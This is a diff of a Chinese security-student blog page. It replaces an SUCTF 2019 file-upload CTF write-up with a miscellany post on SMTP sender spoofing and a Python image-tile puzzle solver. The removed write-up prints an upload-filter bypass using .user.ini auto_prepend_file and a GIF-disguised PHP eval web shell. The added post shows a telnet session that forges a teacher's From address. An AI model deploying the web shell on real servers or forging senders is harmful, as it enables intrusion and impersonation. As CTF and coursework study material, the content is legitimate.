@@ -3,13 +3,13 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     
-    <link rel="canonical" href="https://tjuyjn.top/2019/08/19/CheckIn/">
+    <link rel="canonical" href="https://tjuyjn.top/2019/09/25/杂篇/">
     
     
-    <title>CheckIn | Anti-entropy&#39;s blog | 向一切虚伪的美好宣战</title>
+    <title>杂篇 | Anti-entropy&#39;s blog | 向一切虚伪的美好宣战</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="keywords" content="web,文件上传漏洞,文件包含漏洞">
+    <meta name="keywords" content="python,misc,smtp">
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
     <link rel="stylesheet" href="/css/style.css?v=1.4.2">
@@ -247,7 +247,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>CheckIn</span>
+            <span>杂篇</span>
             
         </div>
         
@@ -260,11 +260,11 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">CheckIn</h1>
+        <h1 class="title">杂篇</h1>
         <h5 class="subtitle">
             
-                <time datetime="2019-08-19T13:32:19.000Z" itemprop="datePublished" class="page-time">
-  2019-08-19
+                <time datetime="2019-09-25T12:04:00.000Z" itemprop="datePublished" class="page-time">
+  2019-09-25
 </time>
 
 
@@ -291,12 +291,12 @@
 
 
 <div class="container body-wrap">
-    <article id="post-CheckIn"
+    <article id="post-杂篇"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">CheckIn</h1>
+        <h1 class="post-card-title">杂篇</h1>
         <div class="post-meta">
-            <time class="post-time" title="2019-08-19 21:32:19" datetime="2019-08-19T13:32:19.000Z"  itemprop="datePublished">2019-08-19</time>
+            <time class="post-time" title="2019-09-25 20:04:00" datetime="2019-09-25T12:04:00.000Z"  itemprop="datePublished">2019-09-25</time>
 
             
 
@@ -306,8 +306,8 @@
             
     <span class="leancloud-comment">
         <i class="icon icon-comment-o"></i>
-        <a href="/2019/08/19/CheckIn/#comment">
-            <span class="valine-comment-count" data-xid="/2019/08/19/CheckIn/"></span>
+        <a href="/2019/09/25/杂篇/#comment">
+            <span class="valine-comment-count" data-xid="/2019/09/25/杂篇/"></span>
         </a>
     </span>
 
@@ -317,38 +317,42 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <p>来源: SUCTF 2019</p>
+            <p>We will we will rock you!</p>
 <a id="more"></a>
-<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>感谢<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd学长</a>和南开的<a href>QHX学长</a>, 在他们的指导下菜逼我终于搞出了这道题.</p>
-<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码:"></a>题目代码:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;fileUpload&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htaccess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;Your files : &lt;br&gt;&apos;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="杂篇"><a href="#杂篇" class="headerlink" title="杂篇"></a>杂篇</h1><h2 id="smtp-发送伪造邮件"><a href="#smtp-发送伪造邮件" class="headerlink" title="smtp 发送伪造邮件"></a>smtp 发送伪造邮件</h2><p>计网老师布置的一个小任务 : 伪装<code>ligang</code>老师给他发个邮件. </p>
+<p>通过telnet与smtp服务器进行命令行交互, 手工编写邮件内容, 就可以设置的发件人.</p>
+<p>以下演示在<code>Windows10 cmd</code>中.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet</span><br><span class="line">&gt; o smtp.qq.com 587</span><br><span class="line">220 smtp.qq.com Esmtp QQ Mail Server </span><br><span class="line">&gt; helo smtp</span><br><span class="line">250 smtp.qq.com                    </span><br><span class="line">&gt; starttls  </span><br><span class="line">220 Ready to start TLS             </span><br><span class="line">&gt; auth login                       </span><br><span class="line">334 VXNlcm5hbWU6   </span><br><span class="line">&gt; MTM0ODY1MTU4MEBxcS5jb20=  <span class="comment"># qq邮箱的base64编码</span></span><br><span class="line">334 UGFzc3dvcmQ6                  </span><br><span class="line">&gt; ***************   <span class="comment"># qq邮箱授权码的base64编码              </span></span><br><span class="line">235 Authentication successful     </span><br><span class="line">&gt; mail from:&lt;1348651580@qq.com&gt;            </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; rcpt to:&lt;3018******@tju.edu.cn&gt;          </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; data </span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;      </span><br><span class="line">&gt; from:ligang@tju.edu.cn            </span><br><span class="line">&gt; to:&lt;3018******@tju.edu.cn&gt;</span><br><span class="line">&gt; subject:i want to play a game    </span><br><span class="line">&gt; </span><br><span class="line">&gt; we will we will rockyou.</span><br><span class="line">&gt; .</span><br><span class="line">250 Ok: queued as</span><br></pre></td></tr></table></figure>
 
-<h2 id="题目特点"><a href="#题目特点" class="headerlink" title="题目特点:"></a>题目特点:</h2><ul>
-<li>一看就是文件上传漏洞</li>
-<li>会给出上传文件的目录</li>
-<li>上传文件所在得目录下会自带个index.php, 这是一个关键的突破口.</li>
-<li>会给出上传目录的<code>ls</code>的 var_dump .</li>
-</ul>
-<h2 id="题目难点"><a href="#题目难点" class="headerlink" title="题目难点:"></a>题目难点:</h2><ul>
-<li>文件后缀名检测, 这让我们没法直接上传<code>.php</code>文件.</li>
-<li>文件内容(首部)检测, 只能是图片格式.</li>
-<li>检测<code>&lt;?</code>, 一句话木马不能用最常用的写法了.</li>
-</ul>
-<h2 id="题目解法-可能不唯一"><a href="#题目解法-可能不唯一" class="headerlink" title="题目解法(可能不唯一):"></a>题目解法(可能不唯一):</h2><p>因为我们没法上传php文件, 所以一定要让我们的马在 index.php 里运行.<br>这就会用到文件包含漏洞.</p>
-<p>和我之前见到的<code>include &quot;xxx.xxx&quot;</code>不同, 这里需要用到文件<code>.user.ini</code>和<code>auto_prepend_file=filename.xxx</code>.</p>
-<p>在这道题的配置中, 如果web目录下有上述的配置文件, 就可以在运行index.php时先解析<code>filename.xxx</code>文件. 而且可以是任何后缀的文件.</p>
-<p>虽然不能写<code>&lt;?php   php_code     ?&gt;</code>这种形式, 但是可以用<code>&lt;script language=&quot;php&quot;&gt;php_code&lt;/sript&gt;</code>代替.</p>
-<p>对于图片内容的检测, 如果我们以gif文件作为payload, 只需要加上<code>GIF89A</code>即可绕过. (仅对于本题中的<code>exif_imagetype()</code>函数及类似的检测方式.)</p>
-<p>几个常见的文件头<br>|文件类型|文件头|文件尾|<br>|:—|:—|:—|<br>|PNG|89504E47|AE426082|<br>|GIF|47494638|003B|<br>|JPEG|FFD8FF|FFD9|<br>|ZIP|504B0304|504B|<br>|PDF|255044462D|—-|</p>
-<p><a href="http://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">还有一些不是很常用的</a></p>
-<h2 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h2><p>.user.ini</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=home.gif</span><br></pre></td></tr></table></figure>
+<p>按照上面的输入成功后, 会有如下的效果.</p>
+<figure class="image-box">
+                <a rel=杂篇 href="http://188.131.227.20:999/picture/smtp.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/smtp.png" alt title class></a>
+                <p></p>
+            </figure>
 
-<p>home.gif</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>eval($_POST['cmd']);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以发现, 发件人成功的显示成了<code>ligang</code>.</p>
+<p>不过细心的你(口区)应该已经发现了, 最后竟然显示了我真实的邮箱 ! ! !</p>
+<p>那么, 这是否代表我的操作失败了呢?</p>
+<p>其实不然, 之所以会出现这个由 * * * * 代发, 并不意味着我这骗子的身份被揭穿.</p>
+<p>事实上, 很多国外的大型网站在发送邮件时都会显示代发字样, 如 groupon, twiter, pinterest等.</p>
+<p>而我这里出现了代发的原因是, 我”假冒”的发件人邮箱地址为<code>tju.edu.cn</code>, 而我自己使用的为qq邮箱, 域名为<code>qq.com</code>.</p>
+<p>理论上, 只要我使用<code>smtp.tju.edu.cn</code>发送, 就可以避免.</p>
+<p>友情提示, 这种欺骗手段只要查看了邮件头就没有任何效果了, 只能拿去吓唬吓唬其它专业的同学们, 哈哈哈.</p>
+<h2 id="phpstudy-后门复现"><a href="#phpstudy-后门复现" class="headerlink" title="phpstudy 后门复现"></a>phpstudy 后门复现</h2><p>// TODO</p>
+<h2 id="python-拼接图像"><a href="#python-拼接图像" class="headerlink" title="python 拼接图像"></a>python 拼接图像</h2><p>在我们协会的平台上看的一道题.</p>
+<p><a href="http://ctf.teamdie.club/files/45c9b42681825f26b823e44736e16a5a/d9710b4ddcbf457cb716ee5423c7f32e.zip" target="_blank" rel="noopener">附件链接</a></p>
+<p>题目描述:</p>
+<blockquote>
+<p>[medium]<br>谁把我壁纸切了啊 ?<br>prpr~<br>请提交：flag{something}<br>来源：2019字节跳动网络安全大赛(byteCTF)</p>
+</blockquote>
+<p>附件里有231个小图片. 看这意思是要把它拼成一整张壁纸. <strong>PS大佬可以尝试下手动拼接, 欸嘿嘿</strong></p>
+<p>对于这种图像处理的任务, 可以使用python的PIL库. 功能似乎很强大, 正在学习中…</p>
+<p>我根据<code>p4ssw0rd学长</code>的一道类似题的python代码, A了这道题. </p>
+<p>边看代码边分析:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">"./all/"</span></span><br><span class="line"><span class="comment"># 获取文件列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_list</span><span class="params">(file_path)</span>:</span></span><br><span class="line">    dir_list = os.listdir(file_path) <span class="comment"># 未排序</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dir_list:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># os.path.getmtime() 函数是获取文件最后修改时间</span></span><br><span class="line">        <span class="comment"># os.path.getctime() 函数是获取文件最后创建时间 </span></span><br><span class="line">        dir_list = sorted(</span><br><span class="line">            dir_list,  </span><br><span class="line">            key=<span class="keyword">lambda</span> x: os.path.getmtime(</span><br><span class="line">                os.path.join(file_path,x)</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="comment"># 这行代码比较复杂, 逐行分析</span></span><br><span class="line">        <span class="comment"># 首先sorted()是一个基本的内置的排序函数, 这里加入了参数key=lambda.</span></span><br><span class="line">        <span class="comment"># lambda是一个隐函数. 后面的x代表的是列表dir_list中的某个元素</span></span><br><span class="line">        <span class="comment"># x 本身并无实际意义, 仅仅是供表达式使用的一个名字. 类似f(x)中的x</span></span><br><span class="line">        <span class="comment"># os.path.join(file_path,x)是将两个参数以路径的格式拼接在一起</span></span><br><span class="line">        <span class="comment"># 即会适当的补全'/'. </span></span><br><span class="line">        <span class="comment"># 不过因为此处的file_path就是"./all/"</span></span><br><span class="line">        <span class="comment"># 所以这段就等效于 (file_path+x)</span></span><br><span class="line">        <span class="comment"># os.path.getmtime(os.path.join(file_path,x))) 的意义就是</span></span><br><span class="line">        <span class="comment"># 列表中每个元素(代表文件路径)对应的文件的最后修改时间</span></span><br><span class="line">        <span class="comment"># 整行代码会使dir_list中的元素按照文件最后修改时间的升序排序.</span></span><br><span class="line">        <span class="keyword">return</span> dir_list</span><br><span class="line"></span><br><span class="line">list_im = get_file_list(path)[:] </span><br><span class="line">print(list_im)</span><br><span class="line"><span class="comment"># 小图片一共有231个</span></span><br><span class="line"><span class="comment"># 231 = 3 * 7 * 11</span></span><br><span class="line"><span class="comment"># 由于要拼接的是一个壁纸, 通常宽:高约为2:1</span></span><br><span class="line"><span class="comment"># 所以猜测 宽=21(张), 高=11(张)  (猜对了~~)</span></span><br><span class="line">column = <span class="number">21</span></span><br><span class="line">row_num = <span class="number">11</span></span><br><span class="line"><span class="comment"># 所有小图片的像素的宽和高</span></span><br><span class="line">width = <span class="number">35</span></span><br><span class="line">height = <span class="number">43</span></span><br><span class="line"><span class="comment"># 将Image对象置于列表中</span></span><br><span class="line">imgs = [Image.open(path+i) <span class="keyword">for</span> i <span class="keyword">in</span> list_im]</span><br><span class="line"><span class="comment"># 建立一个Image"容器", 供我们向其中添加小图片</span></span><br><span class="line">target = Image.new(<span class="string">'RGB'</span>, (width*column, height*row_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(</span><br><span class="line">        len(list_im)</span><br><span class="line">    ):</span><br><span class="line">    <span class="comment"># 仅当i = 0, 21, 42, 63...时执行</span></span><br><span class="line">    <span class="keyword">if</span> i % column == <span class="number">0</span>:</span><br><span class="line">        end = i + column </span><br><span class="line">        <span class="comment"># enumetate() 将可迭代的遍历的数据的下标和数据组合并返回enumerate对象</span></span><br><span class="line">        <span class="comment"># 此对象可使用for迭代遍历</span></span><br><span class="line">        <span class="comment"># 例如:  </span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; seasons = ['Spring', 'Summer', 'Fall', 'Winter']</span></span><br><span class="line">        <span class="comment"># &gt;&gt;&gt; list(enumerate(seasons))</span></span><br><span class="line">        <span class="comment"># [(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]</span></span><br><span class="line">        <span class="keyword">for</span> col, image <span class="keyword">in</span> enumerate(imgs[i:i+column]):</span><br><span class="line">            target.paste(</span><br><span class="line">                image, </span><br><span class="line">                <span class="comment"># 此处第二个参数, 为代表粘贴到的位置的左上角和右下角的坐标</span></span><br><span class="line">                (</span><br><span class="line">                    width*col, <span class="comment"># 左上 x </span></span><br><span class="line">                    height*(i//column), <span class="comment"># 左上 y </span></span><br><span class="line">                    width*(col + <span class="number">1</span>), <span class="comment"># 右下 x</span></span><br><span class="line">                    height*(i//column + <span class="number">1</span>) <span class="comment"># 右下 y</span></span><br><span class="line">                )</span><br><span class="line">            )   </span><br><span class="line"><span class="comment"># 在Windows下此函数可直接打开生成的图片并显示</span></span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure>
 
-<p>上传这两个文件后, 在访问同一目录下的 index.php , 我们的代码就被执行了.</p>
-<p>flag: <code>SUCTF{U5er_1n1_01d_TR1ck}</code></p>
-<p>完.</p>
+<p><del>啊, 我写的注释竟然比代码行数多了.</del></p>
+<p>over.</p>
 
         </div>
         
@@ -356,12 +360,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-09-18T14:14:00.424Z" itemprop="dateUpdated">2019-09-18 22:14:00</time>
+    Last updated: <time datetime="2019-09-25T16:22:04.553Z" itemprop="dateUpdated">2019-09-26 00:22:04</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2019/08/19/CheckIn/" target="_blank" rel="external">https://tjuyjn.top/2019/08/19/CheckIn/</a>
+        转载注明出处，原文地址：<a href="/2019/09/25/杂篇/" target="_blank" rel="external">https://tjuyjn.top/2019/09/25/杂篇/</a>
         
     </div>
     <footer>
@@ -381,7 +385,7 @@
         
         <div class="post-footer">
             
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件上传漏洞/">文件上传漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a></li></ul>
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/smtp/">smtp</a></li></ul>
 
             <div class="page-share-wrap">
     
@@ -390,7 +394,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/08/19/CheckIn/&title=《CheckIn》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/09/25/杂篇/&title=《杂篇》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -402,25 +406,25 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/08/19/CheckIn/&title=《CheckIn》 — Anti-entropy's blog&source=来源: SUCTF 2019" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/09/25/杂篇/&title=《杂篇》 — Anti-entropy's blog&source=We will we will rock you!" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/08/19/CheckIn/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/09/25/杂篇/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CheckIn》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/08/19/CheckIn/&via=https://tjuyjn.top" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《杂篇》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/09/25/杂篇/&via=https://tjuyjn.top" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/08/19/CheckIn/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/09/25/杂篇/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -445,21 +449,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2019/08/29/python自动化处理word文档/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">python自动化处理word文档</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="next">
-      <a href="/2019/08/17/asciiview/" id="post-next" class="post-nav-link">
+      <a href="/2019/09/18/服务器运维/" id="post-next" class="post-nav-link">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">一个有意思的小工具——aview</h4>
+        <h4 class="title">linux 常用命令</h4>
       </a>
     </div>
   
@@ -471,7 +468,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CheckIn"><span class="post-toc-number">1.</span> <span class="post-toc-text">CheckIn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目代码"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">题目代码:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目特点"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">题目特点:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目难点"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">题目难点:</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目解法-可能不唯一"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">题目解法(可能不唯一):</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总之"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">总之</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#杂篇"><span class="post-toc-number">1.</span> <span class="post-toc-text">杂篇</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#smtp-发送伪造邮件"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">smtp 发送伪造邮件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#phpstudy-后门复现"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">phpstudy 后门复现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#python-拼接图像"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">python 拼接图像</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
@@ -592,7 +589,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/08/19/CheckIn/&title=《CheckIn》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/09/25/杂篇/&title=《杂篇》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -604,25 +601,25 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/08/19/CheckIn/&title=《CheckIn》 — Anti-entropy's blog&source=来源: SUCTF 2019" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/09/25/杂篇/&title=《杂篇》 — Anti-entropy's blog&source=We will we will rock you!" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/08/19/CheckIn/" data-title=" Facebook">
